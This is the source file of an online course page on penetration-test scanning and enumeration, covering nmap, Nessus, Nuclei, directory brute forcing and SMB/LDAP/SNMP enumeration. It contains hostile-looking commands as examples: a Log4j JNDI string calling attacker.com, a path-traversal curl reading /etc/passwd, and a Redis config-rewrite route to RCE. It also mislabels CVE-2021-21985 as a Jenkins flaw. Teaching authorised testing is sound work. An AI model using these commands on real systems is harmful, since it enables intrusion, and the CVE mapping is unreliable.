import { LearnLayout } from '@/components/content/LearnLayout'
import { KeyTakeaways } from '@/components/content/KeyTakeaways'
import { Callout } from '@/components/content/Callout'
import Link from 'next/link'

const C = '#ff4757'

const s = {
  p: { fontSize: 15, color: 'var(--text)', lineHeight: 1.9, marginBottom: 16 } as React.CSSProperties,
  h: { fontSize: 20, fontWeight: 700, color: 'var(--heading)', marginTop: 36, marginBottom: 12 } as React.CSSProperties,
  hl: { color: C, fontWeight: 600 } as React.CSSProperties,
  block: {
    background: 'var(--code-bg)', border: '1px solid var(--border)',
    borderRadius: 8, padding: '16px 20px', fontFamily: 'monospace',
    fontSize: 13, lineHeight: 1.8, marginBottom: 20, whiteSpace: 'pre-wrap' as const,
    overflowX: 'auto' as const,
  },
  table: { width: '100%', borderCollapse: 'collapse' as const, marginBottom: 24, fontSize: 14 },
  th: { background: 'var(--code-bg)', padding: '10px 14px', textAlign: 'left' as const, fontWeight: 600, borderBottom: '2px solid var(--border)' },
  td: { padding: '10px 14px', borderBottom: '1px solid var(--border)', verticalAlign: 'top' as const },
  divider: { border: 'none', borderTop: '1px solid var(--border)', margin: '40px 0' },
  iqBox: { background: 'var(--code-bg)', borderLeft: `4px solid ${C}`, borderRadius: 6, padding: '16px 20px', marginBottom: 20 },
  errBox: { background: '#1a0a0a', borderLeft: '4px solid #ff4757', borderRadius: 6, padding: '16px 20px', marginBottom: 20 },
}

function Part({ children }: { children: React.ReactNode }) { return <div style={{ marginBottom: 48 }}>{children}</div> }
function H({ children }: { children: React.ReactNode }) { return <h2 style={s.h}>{children}</h2> }
function P({ children }: { children: React.ReactNode }) { return <p style={s.p}>{children}</p> }
function Hl({ children }: { children: React.ReactNode }) { return <span style={s.hl}>{children}</span> }
function HR() { return <hr style={s.divider} /> }
function Block({ children }: { children: React.ReactNode }) { return <pre style={s.block}>{children}</pre> }
function IQ({ q, children }: { q: string; children: React.ReactNode }) {
  return (
    <div style={s.iqBox}>
      <div style={{ fontWeight: 700, color: C, marginBottom: 8 }}>Q: {q}</div>
      <div style={{ fontSize: 14, color: 'var(--text)', lineHeight: 1.8 }}>{children}</div>
    </div>
  )
}
function Err({ title, cause, fix }: { title: string; cause: string; fix: string }) {
  return (
    <div style={s.errBox}>
      <div style={{ color: '#ff4757', fontWeight: 700, marginBottom: 6 }}>✗ {title}</div>
      <div style={{ fontSize: 13, color: '#ccc', marginBottom: 4 }}><strong>Why it happens:</strong> {cause}</div>
      <div style={{ fontSize: 13, color: '#ccc' }}><strong>Fix:</strong> {fix}</div>
    </div>
  )
}
function ProTip({ children }: { children: React.ReactNode }) {
  return (
    <div style={{ background: '#0a1a0a', borderLeft: '4px solid #2ed573', borderRadius: 6, padding: '14px 18px', marginBottom: 20, fontSize: 14, color: '#ccc', lineHeight: 1.8 }}>
      <strong style={{ color: '#2ed573' }}>Pro tip:</strong> {children}
    </div>
  )
}

export default function Module23() {
  return (
    <LearnLayout
      title="Scanning and Enumeration"
      description="Systematic port scanning with nmap, service fingerprinting, vulnerability scanning with Nessus and Nuclei, web directory enumeration, SMB/LDAP enumeration, and building the vulnerability hypothesis list."
      section="Cybersecurity — Module 23"
      readTime="33 min"
      updatedAt="May 2026"
    >
      <Part>
        <P>
          Reconnaissance told you what exists — scanning tells you what is running on it and whether it is vulnerable.
          Scanning is <Hl>active reconnaissance</Hl>: you send packets to target systems and interpret their responses.
          This phase is detectable. A blue team with decent network monitoring will see your nmap scan within minutes.
          That is why you do recon first, confirm scope, then scan deliberately rather than spraying everything at once.
        </P>
        <P>
          The goal of scanning and enumeration is a <Hl>vulnerability hypothesis list</Hl>: for each discovered service, a prioritised list of "this version may be vulnerable to X, test it." That list drives Phase 3 (exploitation) and keeps the engagement structured rather than opportunistic.
        </P>
        <Callout type="info">
          Scanning produces significant network traffic and will appear in target server logs and IDS/IPS alerts. Only scan systems you have explicit written authorisation to test.
        </Callout>
      </Part>

      <HR />

      <Part>
        <H>nmap — The Industry-Standard Port Scanner</H>
        <P>
          <Hl>nmap</Hl> (Network Mapper) is the tool every security professional uses for port scanning. Understanding its scan types, timing, and output options is fundamental knowledge for both pentesters and defenders who need to understand what attackers see.
        </P>
        <Block>{`# ━━ HOST DISCOVERY ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Ping sweep — find live hosts before scanning ports
nmap -sn 192.168.1.0/24
# -sn: no port scan, just host discovery (ICMP echo + TCP SYN to 443 + ACK to 80)
# Output: which IPs are up, MAC addresses on local network

# Disable ping (for hosts that block ICMP)
nmap -Pn 192.168.1.10
# Assumes host is up and scans anyway — slower, more noise


# ━━ PORT SCAN TYPES ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# SYN scan (default, requires root) — "half open"
nmap -sS 192.168.1.10
# Sends SYN, receives SYN-ACK (open) or RST (closed)
# Does NOT complete TCP handshake → less likely to appear in application logs
# Firewall still logs it, but web server access log won't

# Connect scan (no root required)
nmap -sT 192.168.1.10
# Completes full TCP handshake — more reliable but louder
# Appears in application logs

# UDP scan — slow but finds DNS (53), SNMP (161), TFTP (69), NTP (123)
nmap -sU 192.168.1.10
# UDP is connectionless — nmap sends packets and waits; ICMP port unreachable = closed

# NULL / FIN / Xmas scans — firewall evasion (limited effectiveness)
nmap -sN 192.168.1.10   # NULL: no flags set
nmap -sF 192.168.1.10   # FIN: only FIN flag
nmap -sX 192.168.1.10   # Xmas: FIN + PSH + URG flags
# Open ports ignore these; closed ports send RST
# Some firewalls that block SYN scans pass these (RFC-compliant hosts only)


# ━━ PRACTICAL SCANNING WORKFLOW ━━━━━━━━━━━━━━━━━━━━━━━━

# Step 1: Fast scan — top 1000 ports to get quick picture
nmap -F --open 192.168.1.10

# Step 2: Full port scan — all 65535 ports (slow but thorough)
nmap -p- --open -T4 192.168.1.10

# Step 3: Targeted deep scan on discovered open ports
nmap -sV -sC -p 22,80,443,8080,8443,3306 192.168.1.10
# -sV: version detection (banner grabbing)
# -sC: default scripts (runs safe NSE scripts for each service)

# Full professional scan (combine all):
nmap -sV -sC -p- -T4 --open -oA scan_results 192.168.1.10
# -oA: save output in all formats (nmap, grepable, XML)


# ━━ TIMING TEMPLATES ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# -T0: Paranoid — 5 min between probes (IDS evasion)
# -T1: Sneaky — 15 sec between probes
# -T2: Polite — 0.4 sec between probes
# -T3: Normal — default
# -T4: Aggressive — 10ms timeout, good for fast networks
# -T5: Insane — can miss open ports, can crash services — avoid on production


# ━━ NSE SCRIPTS — NMAP SCRIPTING ENGINE ━━━━━━━━━━━━━━━━

# Run script categories:
nmap --script=safe 192.168.1.10        # safe scripts only
nmap --script=vuln 192.168.1.10        # vulnerability detection
nmap --script=auth 192.168.1.10        # auth bypass and default creds
nmap --script=brute 192.168.1.10       # brute force (careful on production)

# Service-specific scripts:
nmap --script=smb-vuln-ms17-010 192.168.1.10   # EternalBlue (MS17-010)
nmap --script=smb-enum-shares,smb-enum-users 192.168.1.10
nmap --script=mysql-info,mysql-empty-password -p 3306 192.168.1.10
nmap --script=ssh-auth-methods -p 22 192.168.1.10
nmap --script=http-title,http-headers -p 80,443,8080 192.168.1.10`}</Block>
        <ProTip>
          Save every scan with <code>-oA filename</code> — it writes nmap, grepable, and XML format simultaneously. Use the XML output with tools like nmap-parse-output or import into Metasploit db. Grepable format is convenient for quick pipeline filtering: <code>grep "open" scan_results.gnmap</code>.
        </ProTip>
      </Part>

      <HR />

      <Part>
        <H>Service Fingerprinting — Reading Banners</H>
        <P>
          Version detection (<code>-sV</code>) is how nmap identifies what software is running on a port. It works by sending service-specific probes and comparing responses against its probe database. The result — "Apache httpd 2.4.49" or "OpenSSH 7.4" — is the primary input to vulnerability lookup.
        </P>
        <Block>{`# Banner grabbing — manual version of what nmap -sV does automatically
nc -nv 192.168.1.10 22        # SSH banner
nc -nv 192.168.1.10 25        # SMTP banner
nc -nv 192.168.1.10 80        # HTTP — send "HEAD / HTTP/1.0\r\n\r\n"

# curl for web services
curl -I https://target.com    # HTTP headers including Server:
curl -s https://target.com | grep -i "version\|powered\|generator"

# openssl for TLS details
openssl s_client -connect target.com:443 -brief
# Shows: certificate details, cipher suite, TLS version
# TLS 1.0/1.1 support = reportable finding; weak ciphers = reportable finding

# After identifying versions — check against vulnerability databases:
# searchsploit (local ExploitDB copy):
searchsploit "Apache 2.4.49"
searchsploit "OpenSSH 7.4"

# Online:
# vulners.com — comprehensive vulnerability search
# nvd.nist.gov — NVD CVE search
# exploit-db.com — actual exploit code
# packetstormsecurity.com — exploits and tools`}</Block>
        <table style={s.table}>
          <thead>
            <tr>
              <th style={s.th}>Service</th>
              <th style={s.th}>Default port</th>
              <th style={s.th}>What version reveals</th>
              <th style={s.th}>Common vulnerabilities to check</th>
            </tr>
          </thead>
          <tbody>
            {[
              ['SSH', '22/tcp', 'OpenSSH version, supported auth methods', 'Username enumeration (pre-7.7), weak crypto, default creds'],
              ['HTTP/HTTPS', '80, 443/tcp', 'Web server (Apache, nginx, IIS) version', 'CVEs for specific version, misconfig, outdated CMS'],
              ['SMB', '445/tcp', 'Windows version, domain membership', 'EternalBlue (MS17-010), PrintNightmare (CVE-2021-34527)'],
              ['RDP', '3389/tcp', 'Windows version', 'BlueKeep (CVE-2019-0708), DejaBlue, weak auth'],
              ['FTP', '21/tcp', 'FTP server software and version', 'Anonymous login, weak creds, bounce attacks'],
              ['SMTP', '25/tcp', 'Mail server software', 'Open relay, user enumeration (VRFY/EXPN), weak auth'],
              ['MySQL/MSSQL', '3306, 1433/tcp', 'Database version', 'Default creds (root:, sa:), public exposure'],
              ['Redis', '6379/tcp', 'Redis version', 'No auth (common misconfiguration), RCE via config rewrite'],
              ['MongoDB', '27017/tcp', 'MongoDB version', 'No auth (very common), data exposure'],
            ].map(([svc, port, ver, vulns]) => (
              <tr key={svc}>
                <td style={{ ...s.td, fontWeight: 600 }}>{svc}</td>
                <td style={{ ...s.td, fontFamily: 'monospace', fontSize: 13 }}>{port}</td>
                <td style={s.td}>{ver}</td>
                <td style={s.td}>{vulns}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </Part>

      <HR />

      <Part>
        <H>Vulnerability Scanning — Nessus and Nuclei</H>
        <P>
          Automated vulnerability scanners send targeted probes to detect known vulnerabilities — they go beyond port/version detection to actively test whether specific CVEs are present.
        </P>
        <P>
          <Hl>Nessus</Hl> (Tenable) is the industry standard. Nessus Essentials is free for up to 16 IPs. Professional licenses ($3,000+/year) cover unlimited IPs. It has over 175,000 plugins covering CVEs, misconfigurations, and compliance checks.
        </P>
        <Block>{`# Nessus workflow (GUI-based, CLI via API):
# 1. Create a new scan → Basic Network Scan or Advanced Scan
# 2. Targets: IP range or hostname list
# 3. Credentials: provide SSH/Windows credentials for authenticated scan
#    (authenticated scans find 4–5x more vulnerabilities than unauthenticated)
# 4. Run scan → review findings by severity

# Nessus finding format:
# Plugin: 10180 - Ping Remote Host
# CVE:    CVE-2021-44228
# CVSS:   10.0 (Critical)
# Synopsis: The remote host is running Log4j with a critical RCE vulnerability
# Solution:  Upgrade Log4j to 2.16.0 or later
# Output:    JNDI lookup confirmed vulnerable: ${'{'}jndi:ldap://attacker.com/a{'}'}


# Nuclei — fast, template-based scanner (open source, preferred for pentesting)
# 9,000+ templates covering CVEs, misconfigs, exposed panels, default creds

# Basic scan:
nuclei -u https://target.com

# Severity filtering:
nuclei -u https://target.com -severity critical,high

# Scan multiple targets:
nuclei -list targets.txt -severity critical,high,medium

# Specific template categories:
nuclei -u https://target.com -tags cve              # CVE templates only
nuclei -u https://target.com -tags default-login    # default credentials
nuclei -u https://target.com -tags misconfig        # misconfigurations
nuclei -u https://target.com -tags exposed-panels   # admin panels, dashboards

# Custom rate limiting (be careful with production):
nuclei -u https://target.com -rate-limit 50 -bulk-size 25

# Output to file:
nuclei -u https://target.com -o nuclei_results.txt -json`}</Block>
        <P>
          The critical distinction: vulnerability scanners report <Hl>potential vulnerabilities</Hl> based on version matching and probe responses. Manual verification is always required. A Nessus finding of "Apache 2.4.49 detected — CVE-2021-41773 (path traversal/RCE)" needs to be manually confirmed by attempting the exploit, because the server may have been patched at the OS level without an Apache version update.
        </P>
      </Part>

      <HR />

      <Part>
        <H>Web Application Enumeration</H>
        <P>
          After identifying web services, systematic enumeration finds hidden directories, files, parameters, and virtual hosts that are not linked from the main application but are still accessible.
        </P>
        <Block>{`# Directory and file brute force
# gobuster — fast, concurrent, Go-based
gobuster dir -u https://target.com \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -t 50 \
  -x php,html,txt,bak,conf \
  -o gobuster_results.txt

# ffuf — flexible fuzzing tool (also excellent for params and subdomains)
ffuf -u https://target.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
  -mc 200,201,204,301,302,307,403 \
  -o ffuf_results.json

# feroxbuster — recursive directory scanning
feroxbuster -u https://target.com --depth 3 -t 100

# Key SecLists wordlists for web enumeration:
# /Discovery/Web-Content/raft-medium-directories.txt  — directories
# /Discovery/Web-Content/raft-medium-files.txt        — files
# /Discovery/Web-Content/common.txt                   — common paths (quick)
# /Discovery/Web-Content/api/api-endpoints.txt        — API paths


# API endpoint discovery
# Many APIs follow common patterns:
ffuf -u https://api.target.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -H "Content-Type: application/json" \
  -mc 200,201,400,401,403,405   # include 401/403 — they confirm endpoint exists

# Parameter fuzzing — find hidden parameters
# arjun — HTTP parameter discovery
arjun -u https://target.com/api/search

# Backup file hunting — developers leave these accidentally
# Common patterns:
# index.php.bak, config.php~, settings.py.old, web.config.bak
ffuf -u https://target.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
  -mc 200 \
  -fc 404

# Virtual host enumeration — different applications on same IP
gobuster vhost -u https://192.168.1.10 \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  --append-domain`}</Block>
      </Part>

      <HR />

      <Part>
        <H>Service-Specific Enumeration</H>
        <P>
          Each discovered service requires targeted enumeration beyond what a port scan reveals. The following covers the most commonly encountered services in professional engagements.
        </P>

        <H>SMB (Windows File Sharing — Port 445)</H>
        <Block>{`# Check for anonymous access
smbclient -L //192.168.1.10 -N         # -N = no password
smbclient //192.168.1.10/SHARE -N      # connect to specific share

# Enumerate shares, users, groups, policies
enum4linux -a 192.168.1.10
enum4linux-ng -A 192.168.1.10          # updated version

# With credentials:
smbmap -H 192.168.1.10 -u username -p password

# Check for EternalBlue (MS17-010) — 2017 but still found regularly
nmap --script smb-vuln-ms17-010 192.168.1.10

# CrackMapExec — Swiss Army knife for SMB/AD
crackmapexec smb 192.168.1.0/24        # discover SMB hosts
crackmapexec smb 192.168.1.10 -u user -p pass --shares  # enum shares
crackmapexec smb 192.168.1.10 -u user -p pass --users   # enum AD users`}</Block>

        <H>LDAP / Active Directory (Port 389, 636)</H>
        <Block>{`# Anonymous LDAP bind — often allowed, reveals AD structure
ldapsearch -x -H ldap://192.168.1.10 -b "DC=corp,DC=local"

# Authenticated LDAP enumeration
ldapsearch -x -H ldap://192.168.1.10 \
  -D "CN=user,DC=corp,DC=local" \
  -w password \
  -b "DC=corp,DC=local" \
  "(objectClass=user)" sAMAccountName mail memberOf

# BloodHound data collection (after getting AD credentials)
# SharpHound — run on domain-joined Windows:
SharpHound.exe -c All --outputdirectory C:\temp\

# BloodHound.py — run from Linux with credentials:
bloodhound-python -u username -p password \
  -d corp.local -ns 192.168.1.10 \
  -c all --zip`}</Block>

        <H>SNMP (Port 161 UDP)</H>
        <Block>{`# SNMP community string brute force — "public" and "private" are common defaults
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt 192.168.1.10

# SNMP walk — extract all OID data with known community string
snmpwalk -v2c -c public 192.168.1.10
# Returns: running processes, network interfaces, routing table,
#          installed software, open ports, user accounts (on some systems)

# Specific OIDs:
snmpwalk -v2c -c public 192.168.1.10 1.3.6.1.2.1.25.4.2.1.2  # running processes
snmpwalk -v2c -c public 192.168.1.10 1.3.6.1.2.1.25.6.3.1.2  # installed software`}</Block>

        <H>FTP (Port 21)</H>
        <Block>{`# Check anonymous login
ftp 192.168.1.10
# Username: anonymous
# Password: (anything or empty)
# If successful: list and download files with get/mget

nmap --script ftp-anon 192.168.1.10   # automated anonymous check
nmap --script ftp-brute --script-args brute.firstonly=true -p 21 192.168.1.10`}</Block>
      </Part>

      <HR />

      <Part>
        <H>Building the Vulnerability Hypothesis List</H>
        <P>
          Everything gathered in scanning flows into a structured hypothesis list that guides exploitation. This is the handoff document from Phase 2 to Phase 3.
        </P>
        <Block>{`VULNERABILITY HYPOTHESIS LIST — AcmeCorp Assessment
Generated: 2026-05-01

━━ PRIORITY 1 — HIGH CONFIDENCE, HIGH IMPACT ━━━━━━━━━━━━━

[VH-001] Apache 2.4.49 Path Traversal + RCE — CVE-2021-41773
  Host:       old.acmecorp.com (203.0.113.50)
  Port:       80/tcp
  Evidence:   Server: Apache/2.4.49 header confirmed
  CVSS:       9.8 Critical
  Test:       curl http://old.acmecorp.com/cgi-bin/.%2e/.%2e/.%2e/etc/passwd
  Notes:      Requires mod_cgi enabled for RCE; path traversal may work regardless

[VH-002] Jenkins 2.289 Unauthenticated RCE — CVE-2021-21985
  Host:       jenkins.acmecorp.com (203.0.113.55)
  Port:       8080/tcp
  Evidence:   Jenkins 2.289 confirmed via /login page version footer
  CVSS:       9.8 Critical
  Test:       Nuclei template: exposed-panels/jenkins/jenkins-panel.yaml
              Then script console RCE if unauth access

[VH-003] Anonymous SMB Read Access
  Host:       192.168.1.20
  Port:       445/tcp
  Evidence:   enum4linux shows SHARE$ accessible without credentials
  CVSS:       7.5 High
  Test:       smbclient //192.168.1.20/SHARE -N → list and download files

━━ PRIORITY 2 — MEDIUM CONFIDENCE OR IMPACT ━━━━━━━━━━━━━━

[VH-004] Redis Unauthenticated Access
  Host:       192.168.1.25
  Port:       6379/tcp
  Evidence:   nmap: Redis key-value store (no auth detected)
  CVSS:       7.5 High
  Test:       redis-cli -h 192.168.1.25 INFO → CONFIG GET bind → RCE via
              config set dir + config set dbfilename + BGSAVE

[VH-005] SNMP Community String "public" Active
  Host:       192.168.1.1 (router)
  Port:       161/udp
  Evidence:   onesixtyone found community "public"
  CVSS:       5.3 Medium
  Test:       snmpwalk — extract running config, connected hosts, routing table

━━ MANUAL TESTING REQUIRED — WEB APPLICATION ━━━━━━━━━━━━

[VH-006] staging.acmecorp.com — Reduced Security Controls
  Host:       staging.acmecorp.com (198.51.100.10)
  Evidence:   Basic auth only, no WAF, different Apache version (2.4.51)
  Tests:      Full OWASP Top 10 manual testing: SQLi, XSS, IDOR, auth bypass
              Gobuster directory enum, API endpoint discovery`}</Block>
        <ProTip>
          The best pentesters do not just list CVEs — they map them to proof-of-concept steps. CVE-2021-41773 without "curl this command and check the response" is just a version match. With the test command, any team member can confirm exploitability immediately.
        </ProTip>
      </Part>

      <HR />

      <Part>
        <H>Interview Questions — Scanning and Enumeration</H>
        <IQ q="What is the difference between a SYN scan and a connect scan in nmap?">
          A SYN scan (nmap -sS) sends a SYN packet and listens for a SYN-ACK (port open) or RST (port closed) but does not complete the TCP three-way handshake — it sends a RST after receiving the SYN-ACK. This is called a "half-open" scan. The advantage is that it is less likely to appear in application-level logs, because the connection is never completed. A connect scan (nmap -sT) completes the full TCP handshake and then closes the connection — it will appear in application access logs. SYN scans require root/administrator privileges to craft raw packets; connect scans use the OS's network stack and do not require elevated privileges.
        </IQ>
        <IQ q="You run nmap and get a list of versions. What do you do next?">
          Cross-reference each version against vulnerability databases: searchsploit for local ExploitDB, NVD/CVE for CVE details, vulners.com for a broad search. For each confirmed CVE, check the CVSS score and whether exploit code is publicly available. Then build a vulnerability hypothesis list: prioritise by CVSS score and confirmed exploit availability, note the exact test command to confirm exploitability, and include contextual impact — a critical CVE on a dev server rates lower than a high CVE on the authentication system. The hypothesis list is input to the exploitation phase, not the exploitation phase itself. Every hypothesis needs manual confirmation.
        </IQ>
        <IQ q="What is the danger of running a -T5 (insane) nmap scan against a production system?">
          The -T5 timing template sets extremely aggressive timeouts — nmap may miss open ports because it does not wait long enough for slow responses, producing false negatives (ports reported as closed when they are open). More critically, the high packet rate can cause CPU exhaustion on network devices, overwhelm stateful firewalls' connection tracking tables, and trigger rate-based IPS blocks that drop all traffic from your IP for hours. On some embedded devices (industrial controllers, older network equipment) aggressive scanning causes crashes or service disruption. On a pentest, this could cause a production outage — a clear scope violation. Use -T4 at most for remote internet targets; -T2 or -T3 for sensitive or embedded systems.
        </IQ>
        <IQ q="What does an authenticated vulnerability scan find that an unauthenticated scan misses?">
          Unauthenticated scans can only see services exposed to the network — they detect open ports, service versions from banners, and network-level vulnerabilities. Authenticated scans log into the system using provided credentials (SSH, WMI/WinRM for Windows) and examine the system from the inside: installed package versions and their actual patch level, registry settings, local configuration files, local user accounts and their privileges, missing patches not visible from service banners, weak local policies, file permissions, and scheduled tasks. Research consistently shows authenticated scans find 4–5 times as many vulnerabilities. The reason: a "Apache 2.4.49" banner may be wrong if the vendor patched the binary — only reading the actual binary or package database reveals the real patch level.
        </IQ>
        <IQ q="What is the purpose of directory brute forcing, and what does finding a 403 response mean?">
          Directory brute forcing sends requests for common directory and file names to discover paths that exist but are not linked from the application. Developers often leave backup files (.bak, .old), configuration files, admin panels, test scripts, and legacy endpoints accessible at predictable paths. A 200 response means the path exists and is accessible. A 301/302 means redirect — often to an auth page, confirming the directory exists. A 403 Forbidden is particularly interesting: it means the server knows the resource exists but is refusing access based on policy. A 403 on /admin/ confirms an admin panel exists even though access is denied — it is still a reportable finding, and further testing may reveal auth bypass techniques.
        </IQ>
      </Part>

      <HR />

      <Part>
        <H>Common Mistakes — Scanning and Enumeration</H>
        <Err
          title="Scanning only the top 1000 ports"
          cause="nmap's default scan covers only the most common 1000 ports. Developers and sysadmins frequently run services on non-standard ports (8080, 8443, 9200, 27017, 6379) specifically to avoid automatic scanning. Stopping at port 1000 misses these."
          fix="Always follow up with a full-port scan: nmap -p- --open -T4 <target>. Run the fast scan first for quick wins, then the full scan in the background while you investigate initial findings. The full scan takes longer but finds services hidden on non-standard ports."
        />
        <Err
          title="Trusting scanner output without manual verification"
          cause="Running Nessus or nuclei and treating the output as confirmed vulnerabilities. Scanners have false positive rates of 20–50% for some checks. Reporting unverified scanner findings to clients wastes their remediation time and destroys your credibility."
          fix="Every Critical and High finding must be manually verified before it enters the report. Use the scanner output as a hypothesis list, then attempt to reproduce each finding. Document the proof-of-concept output (request/response, screenshot) for every confirmed finding."
        />
        <Err
          title="Forgetting UDP ports"
          cause="Most pentesters scan TCP only. UDP services are invisible to TCP scans. SNMP (161) on UDP reveals entire network configurations. DNS (53) on UDP is often exploitable. NTP (123) can be used for amplification. NetBIOS (137) exposes Windows information."
          fix="Always run a UDP scan on at least the top 100 UDP ports: nmap -sU --top-ports 100 <target>. UDP scanning is slower than TCP — run it in parallel with other work rather than waiting for it before proceeding."
        />
        <Err
          title="Running aggressive scans against rate-limited or production APIs"
          cause="Running gobuster with 200 threads against a rate-limited API causes 429 responses and potentially triggers WAF IP blocks, making subsequent testing impossible or triggering an incident response."
          fix="Start with low thread counts (10–20) and observe response times and status codes. If you see 429 or sudden increases in response time, reduce rate. For known WAF-protected targets, use --delay flags and rotate User-Agent headers. Always check the RoE for any rate limiting constraints."
        />
        <Err
          title="Not saving raw scan output"
          cause="Running nmap and not saving with -oA leaves you with terminal output that scrolls away. Three days later you cannot remember which ports were open on which host, and you have to rescan — wasting time and creating more noise."
          fix="Always save output: nmap -oA scans/hostname_date for every scan. Create a directory structure: scans/, screenshots/, notes/, exploit-output/ for each target. Name files descriptively: scans/192.168.1.10_full_20260501.nmap. Raw output is evidence and a reference you will use repeatedly throughout the engagement."
        />
      </Part>

      <HR />

      <KeyTakeaways items={[
        'Scanning is active reconnaissance — it generates traffic the target can detect. Always scan after passive recon confirms scope and only against systems explicitly authorised in the RoE.',
        'nmap -sV -sC -p- -T4 --open -oA results is the standard comprehensive scan: version detection, default scripts, all ports, save all formats. Follow up with a UDP scan for ports 53, 161, 123, 137.',
        'SYN scans (-sS) complete only half the TCP handshake — less likely to appear in application logs. Connect scans (-sT) complete the full handshake but do not require root privileges.',
        'Service fingerprinting (nmap -sV) identifies exact versions, which are cross-referenced against searchsploit, NVD, and vulners.com to build the vulnerability hypothesis list.',
        'Nuclei provides 9,000+ templates for CVEs, default credentials, and misconfigurations. It is faster and more targeted than Nessus for specific checks and preferred for pentest engagements.',
        'Authenticated vulnerability scans find 4–5x more vulnerabilities than unauthenticated — they read package databases, configuration files, and registry settings that are invisible from the network.',
        'Directory brute forcing finds paths not linked from the application. A 403 Forbidden response is as valuable as a 200 — it confirms the resource exists. Common finds: admin panels, backup files, configuration files, API endpoints.',
        'Service-specific enumeration (enum4linux for SMB, ldapsearch for LDAP, snmpwalk for SNMP) extracts information far beyond what port scanning reveals: user accounts, file shares, network topology, installed software.',
        'The output of scanning is a vulnerability hypothesis list — not a list of confirmed vulnerabilities. Every Critical and High hypothesis requires manual exploitation verification before entering the report.',
        'Save all raw scan output with descriptive filenames from the start. Scanner output is both evidence for the report and a reference you will return to repeatedly throughout the engagement.',
      ]} />

      <HR />

      <Callout type="info">
        You have the target mapped and the vulnerability hypotheses formed. In{' '}
        <Link href="/learn/cybersecurity/exploitation-techniques">
          Module 24: Exploitation Techniques
        </Link>
        , you put those hypotheses to the test — using Metasploit, manual exploit development, and service-specific techniques to gain initial access and demonstrate real impact.
      </Callout>
    </LearnLayout>
  )
}
